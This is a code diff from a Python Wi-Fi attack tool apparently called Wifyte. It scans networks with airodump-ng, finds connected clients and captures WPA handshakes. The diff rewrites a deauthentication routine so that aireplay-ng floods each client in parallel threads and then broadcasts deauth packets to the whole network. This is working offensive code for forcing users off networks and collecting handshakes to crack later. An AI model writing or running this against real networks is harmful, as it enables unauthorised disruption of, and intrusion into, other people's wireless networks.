@@ -30,7 +30,11 @@ class Colors:
 
 
 # Log with color
-def colored_log(level, msg):
+def colored_log(level, msg, enabled=True):
+    """Log with color and optional enable/disable"""
+    if not enabled:
+        return
+
     color_map = {
         "info": Colors.BLUE,
         "success": Colors.GREEN,
@@ -191,13 +195,10 @@ class Wifyte:
             colored_log("error", "No monitor mode interface found")
             return []
 
-        colored_log("info", "Starting WiFi network scan...")
-        colored_log("warning", "Press Ctrl+C to stop scanning")
-
-        # File for scan results
+        colored_log("info", "Starting WiFi network scan... About 8 seconds.")
         output_file = os.path.join(self.temp_dir, "scan-01.csv")
 
-        # Start airodump-ng with channel hopping
+        # Start airodump-ng
         proc = subprocess.Popen(
             [
                 "airodump-ng",
@@ -205,31 +206,22 @@ class Wifyte:
                 os.path.join(self.temp_dir, "scan"),
                 "--output-format",
                 "csv",
-                "--channel",  # Use all channels
-                "1,2,3,4,5,6,7,8,9,10,11,12,13",
                 self.monitor_interface,
             ],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         )
 
-        networks = []
-        max_scanning_time = 8  # Default maximum scanning time
-
         try:
-            # Scan for 8 seconds with countdown
-            for i in range(max_scanning_time):
-                time.sleep(1)
-                print(
-                    f"{Colors.BLUE}[*] Scanning... {i+1}/{max_scanning_time}{Colors.ENDC}",
-                    end="\r",
-                )
-            print("\n")  # Move to next line after countdown
+            # Scan for 8 seconds without logging every second
+            time.sleep(8)
         except KeyboardInterrupt:
             colored_log("warning", "Scanning stopped by user")
         finally:
             proc.send_signal(signal.SIGTERM)
             proc.wait()
+
+        networks = []
 
         # Parse CSV results
         if os.path.exists(output_file):
@@ -251,9 +243,6 @@ class Wifyte:
                         if len(parts) >= 14 and parts[13].strip():
                             network_id += 1
                             try:
-                                essid = parts[13].strip().replace("\x00", "")
-                                if not essid:  # Handle hidden SSID
-                                    essid = "<Hidden Network>"
                                 networks.append(
                                     WiFiNetwork(
                                         id=network_id,
@@ -267,7 +256,7 @@ class Wifyte:
                                             else 0
                                         ),
                                         encryption=f"{parts[5]} {parts[6]}".strip(),
-                                        essid=essid,
+                                        essid=parts[13].strip().replace("\x00", ""),
                                     )
                                 )
                             except (ValueError, IndexError):
@@ -277,11 +266,19 @@ class Wifyte:
         else:
             colored_log("error", "Scan results file not found")
 
+        if networks:
+            colored_log("success", f"Found {len(networks)} networks.")
+        else:
+            colored_log("warning", "No networks detected.")
+
         return networks
 
     def detect_connected_clients(self, network: WiFiNetwork) -> List[str]:
         """Detect connected clients to the target network"""
-        colored_log("info", f"Detecting connected clients for {network.essid}...")
+        colored_log(
+            "info",
+            f"Detecting connected clients for {network.essid}... About 10 seconds.",
+        )
         output_file = os.path.join(self.temp_dir, "clients-01.csv")
 
         # Start airodump-ng to detect clients
@@ -301,15 +298,8 @@ class Wifyte:
         )
 
         try:
-            # Wait for 10 seconds with countdown
-            duration = 10
-            for remaining_time in range(duration, 0, -1):
-                print(
-                    f"{Colors.BLUE}[*] Detecting clients... Time left: {remaining_time}s{Colors.ENDC}",
-                    end="\r",
-                )
-                time.sleep(1)
-            print("\n")
+            # Wait for 10 seconds without logging every second
+            time.sleep(10)
         except KeyboardInterrupt:
             colored_log("warning", "Client detection stopped by user!")
         finally:
@@ -338,39 +328,12 @@ class Wifyte:
         else:
             colored_log("error", "Client detection results file not found")
 
-        # Log detected clients
         if clients:
             colored_log("success", f"Detected {len(clients)} connected clients.")
         else:
             colored_log("warning", "No connected clients detected.")
 
         return clients
-
-    def deauthenticate_clients(self, network: WiFiNetwork, clients: List[str]):
-        """Deauthenticate all connected clients"""
-        colored_log(
-            "info",
-            f"Found {len(clients)} connected clients for {network.essid}. Starting deauthentication...",
-        )
-
-        for client in clients:
-            colored_log("info", f"Deauthenticating client {client}...")
-            deauth_cmd = [
-                "aireplay-ng",
-                "--deauth",
-                "20",
-                "-a",
-                network.bssid,
-                "-c",
-                client,
-                self.monitor_interface,
-            ]
-            subprocess.Popen(
-                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
-            time.sleep(1)  # Wait between deauth attempts
-
-        colored_log("success", "Deauthentication completed for all connected clients.")
 
     def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
         """Capture handshake from target network"""
@@ -432,10 +395,13 @@ class Wifyte:
             while not self.handshake_found:
                 elapsed_time = int(time.time() - start_time)
                 remaining_time = max(0, timeout - elapsed_time)
-                print(
-                    f"{Colors.BLUE}[*] Capturing handshake... Time left: {remaining_time}s{Colors.ENDC}",
-                    end="\r",
-                )
+
+                if elapsed_time % 1 == 0:
+                    print(
+                        f"{Colors.BLUE}[*] Capturing handshake... Time left: {remaining_time}s{Colors.ENDC}",
+                        end="\r",
+                    )
+
                 if elapsed_time >= timeout:
                     colored_log(
                         "warning", "Handshake capture timed out after 1 minute."
@@ -462,6 +428,57 @@ class Wifyte:
         shutil.copy(cap_file, final_path)
         colored_log("success", f"Handshake saved to {final_path}")
         return final_path
+
+    def deauthenticate_clients(self, network: WiFiNetwork, clients: List[str]):
+        """Deauthenticate all connected clients using multithreading"""
+        colored_log(
+            "info",
+            f"Starting deauthentication for {len(clients)} clients on {network.essid}...",
+        )
+
+        # 1. Function to perform individual deauth (one by one)
+        def deauth_client(client: str):
+            deauth_cmd = [
+                "aireplay-ng",
+                "--deauth",
+                "10",  # Number of deauth packets
+                "-a",
+                network.bssid,
+                "-c",
+                client,
+                self.monitor_interface,
+            ]
+            subprocess.Popen(
+                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+
+        # Use multithreading to deauth all individual clients in parallel
+        threads = []
+        for client in clients:
+            thread = threading.Thread(target=deauth_client, args=(client,))
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+
+        # Wait for all threads to complete
+        for thread in threads:
+            thread.join()
+
+        # 2. Function to perform broadcast deauth (all at once)
+        broadcast_deauth_cmd = [
+            "aireplay-ng",
+            "--deauth",
+            "10",  # Number of deauth packets
+            "-a",
+            network.bssid,
+            self.monitor_interface,
+        ]
+        subprocess.Popen(
+            broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+
+        # Log completion
+        colored_log("success", "Deauthentication completed for all connected clients.")
 
     def _handshake_watcher(self, cap_file: str):
         """Watch for handshake in capture file"""
